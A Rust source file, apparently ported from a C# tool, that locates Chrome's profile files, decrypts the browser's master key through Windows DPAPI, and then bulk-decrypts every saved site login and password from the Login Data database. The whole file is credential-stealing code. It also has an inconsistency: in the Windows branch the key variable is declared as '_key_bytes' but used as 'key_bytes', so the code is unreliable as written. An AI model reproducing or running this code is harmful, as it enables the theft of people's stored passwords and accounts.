// chrom.rs — Rust port of chrom.cs
// Chrome password decryptor using DPAPI and AES-256-GCM for v80+ encrypted passwords.

use std::fs;
use std::path::PathBuf;
use aes_gcm::{Aes256Gcm, Key, Nonce, KeyInit};
use aes_gcm::aead::Aead;
use base64::Engine;
use log::{info, warn};
use rusqlite::Connection;
use serde_json::Value;

// ==================== Chrome Password Decryptor ====================

pub struct ChromeDecryptor;

impl ChromeDecryptor {
    /// Decrypts a Chrome v80+ AES-256-GCM encrypted value.
    ///
    /// The encrypted blob has the structure:
    ///   "v10"/"v20" (3 bytes) + nonce (12 bytes) + ciphertext + tag (16 bytes)
    pub fn decrypt_password(encrypted: &[u8], aes_key: &[u8]) -> Result<String, String> {
        if encrypted.is_empty() {
            return Ok(String::new());
        }

        // Chrome v80+: prefix "v10" or "v20" → AES-256-GCM
        if encrypted.len() > 31
            && encrypted[0] == b'v'
            && (encrypted[1] == b'1' || encrypted[1] == b'2')
            && encrypted[2] == b'0'
        {
            let nonce_bytes = &encrypted[3..15]; // 12-byte nonce
            let data_len = encrypted.len() - 15;
            if data_len < 17 {
                return Err("Data too short for AES-GCM".to_string());
            }

            let ciphertext_len = data_len - 16;
            let ciphertext = &encrypted[15..15 + ciphertext_len];
            let tag = &encrypted[15 + ciphertext_len..15 + ciphertext_len + 16];

            // Reconstruct as ciphertext+tag (aes-gcm crate expects combined)
            let mut combined = Vec::with_capacity(ciphertext.len() + tag.len());
            combined.extend_from_slice(ciphertext);
            combined.extend_from_slice(tag);

            let key = Key::<Aes256Gcm>::from_slice(aes_key);
            let cipher = Aes256Gcm::new(key);
            let nonce = Nonce::from_slice(nonce_bytes);

            match cipher.decrypt(nonce, combined.as_ref()) {
                Ok(plaintext) => {
                    String::from_utf8(plaintext).map_err(|e| e.to_string())
                }
                Err(e) => Err(format!("AES-GCM decryption failed: {}", e)),
            }
        } else {
            // Legacy DPAPI — Windows only
            #[cfg(target_os = "windows")]
            {
                dpapi_decrypt(encrypted)
                    .map(|bytes| String::from_utf8_lossy(&bytes).to_string())
            }
            #[cfg(not(target_os = "windows"))]
            {
                Err("DPAPI decryption requires Windows".to_string())
            }
        }
    }

    /// Retrieves the Chrome AES encryption key from Local State.
    ///
    /// The key is stored base64-encoded in os_crypt.encrypted_key,
    /// prefixed with "DPAPI" (5 bytes) which must be stripped before DPAPI decryption.
    pub fn get_chrome_encryption_key() -> Result<Vec<u8>, String> {
        let local_state_path = get_chrome_local_state_path();

        if !local_state_path.exists() {
            return Err("Chrome Local State not found".to_string());
        }

        let json_str = fs::read_to_string(&local_state_path)
            .map_err(|e| format!("Failed to read Local State: {}", e))?;

        let parsed: Value = serde_json::from_str(&json_str)
            .map_err(|e| format!("Failed to parse Local State JSON: {}", e))?;

        let key_base64 = parsed
            .get("os_crypt")
            .and_then(|v| v.get("encrypted_key"))
            .and_then(|v| v.as_str())
            .ok_or("encrypted_key not found in Local State")?;

        let key_with_prefix = base64::engine::general_purpose::STANDARD
            .decode(key_base64)
            .map_err(|e| format!("Base64 decode failed: {}", e))?;

        // Strip "DPAPI" prefix (5 bytes)
        if key_with_prefix.len() <= 5 {
            return Err("Encrypted key too short".to_string());
        }
        let _key_bytes = &key_with_prefix[5..];

        // DPAPI decrypt the key (Windows only)
        #[cfg(target_os = "windows")]
        {
            dpapi_decrypt(key_bytes)
        }
        #[cfg(not(target_os = "windows"))]
        {
            Err("DPAPI key decryption requires Windows".to_string())
        }
    }

    /// Extracts all saved Chrome credentials.
    /// Returns a list of (url, username, password) tuples.
    pub fn extract_credentials() -> Vec<(String, String, String)> {
        let mut results = Vec::new();

        let aes_key = match Self::get_chrome_encryption_key() {
            Ok(key) => key,
            Err(e) => {
                warn!("[-] Failed to get Chrome key: {}", e);
                return results;
            }
        };

        let login_data_path = get_chrome_login_data_path();
        if !login_data_path.exists() {
            info!("[-] Login Data not found");
            return results;
        }

        // Copy DB since Chrome locks it
        let temp_dir = std::env::temp_dir().join(format!("cr_{}", uuid::Uuid::new_v4().to_string().get(..8).unwrap_or("tmp")));
        let _ = fs::create_dir_all(&temp_dir);
        let temp_db = temp_dir.join("Login Data");

        if let Err(e) = fs::copy(&login_data_path, &temp_db) {
            warn!("[-] Failed to copy Login Data: {}", e);
            let _ = fs::remove_dir_all(&temp_dir);
            return results;
        }

        // Copy WAL/SHM for consistency
        let wal = login_data_path.with_extension("db-wal");
        let shm = login_data_path.with_extension("db-shm");
        if wal.exists() { let _ = fs::copy(&wal, temp_dir.join("Login Data-wal")); }
        if shm.exists() { let _ = fs::copy(&shm, temp_dir.join("Login Data-shm")); }

        match Connection::open_with_flags(
            &temp_db,
            rusqlite::OpenFlags::SQLITE_OPEN_READ_ONLY,
        ) {
            Ok(conn) => {
                let mut stmt = match conn.prepare(
                    "SELECT origin_url, username_value, password_value FROM logins WHERE length(password_value) > 0"
                ) {
                    Ok(s) => s,
                    Err(e) => {
                        warn!("[-] SQL prepare error: {}", e);
                        let _ = fs::remove_dir_all(&temp_dir);
                        return results;
                    }
                };

                let rows = stmt.query_map([], |row| {
                    let url: String = row.get(0)?;
                    let username: String = row.get(1).unwrap_or_default();
                    let encrypted: Vec<u8> = row.get(2)?;
                    Ok((url, username, encrypted))
                });

                if let Ok(rows) = rows {
                    for row in rows.flatten() {
                        let (url, username, encrypted) = row;
                        match Self::decrypt_password(&encrypted, &aes_key) {
                            Ok(password) => {
                                if !password.is_empty() {
                                    results.push((url, username, password));
                                }
                            }
                            Err(e) => {
                                results.push((url, username, format!("[FAILED: {}]", e)));
                            }
                        }
                    }
                }
            }
            Err(e) => warn!("[-] SQLite open error: {}", e),
        }

        let _ = fs::remove_dir_all(&temp_dir);
        results
    }
}

// ==================== Platform-specific Paths ====================

fn get_chrome_local_state_path() -> PathBuf {
    #[cfg(target_os = "windows")]
    {
        let local_app_data = std::env::var("LOCALAPPDATA")
            .unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Local".to_string());
        PathBuf::from(local_app_data)
            .join("Google")
            .join("Chrome")
            .join("User Data")
            .join("Local State")
    }
    #[cfg(target_os = "linux")]
    {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        PathBuf::from(home)
            .join(".config")
            .join("google-chrome")
            .join("Local State")
    }
    #[cfg(target_os = "macos")]
    {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        PathBuf::from(home)
            .join("Library")
            .join("Application Support")
            .join("Google")
            .join("Chrome")
            .join("Local State")
    }
}

fn get_chrome_login_data_path() -> PathBuf {
    #[cfg(target_os = "windows")]
    {
        let local_app_data = std::env::var("LOCALAPPDATA")
            .unwrap_or_else(|_| "C:\\Users\\Default\\AppData\\Local".to_string());
        PathBuf::from(local_app_data)
            .join("Google")
            .join("Chrome")
            .join("User Data")
            .join("Default")
            .join("Login Data")
    }
    #[cfg(target_os = "linux")]
    {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        PathBuf::from(home)
            .join(".config")
            .join("google-chrome")
            .join("Default")
            .join("Login Data")
    }
    #[cfg(target_os = "macos")]
    {
        let home = std::env::var("HOME").unwrap_or_else(|_| "/tmp".to_string());
        PathBuf::from(home)
            .join("Library")
            .join("Application Support")
            .join("Google")
            .join("Chrome")
            .join("Default")
            .join("Login Data")
    }
}

// ==================== DPAPI (Windows Only) ====================

#[cfg(target_os = "windows")]
pub fn dpapi_decrypt(encrypted: &[u8]) -> Result<Vec<u8>, String> {
    use std::ptr;
    use winapi::um::dpapi::CryptUnprotectData;
    use winapi::um::wincrypt::CRYPTOAPI_BLOB;
    use winapi::um::winbase::LocalFree;

    unsafe {
        let mut data_in = CRYPTOAPI_BLOB {
            cbData: encrypted.len() as u32,
            pbData: encrypted.as_ptr() as *mut u8,
        };
        let mut data_out = CRYPTOAPI_BLOB {
            cbData: 0,
            pbData: ptr::null_mut(),
        };

        let result = CryptUnprotectData(
            &mut data_in,
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            &mut data_out,
        );

        if result == 0 {
            return Err(format!("CryptUnprotectData failed"));
        }

        let output = std::slice::from_raw_parts(data_out.pbData, data_out.cbData as usize).to_vec();
        LocalFree(data_out.pbData as *mut _);
        Ok(output)
    }
}

#[cfg(not(target_os = "windows"))]
#[allow(dead_code)]
fn dpapi_decrypt(_encrypted: &[u8]) -> Result<Vec<u8>, String> {
    Err("DPAPI is only available on Windows".to_string())
}
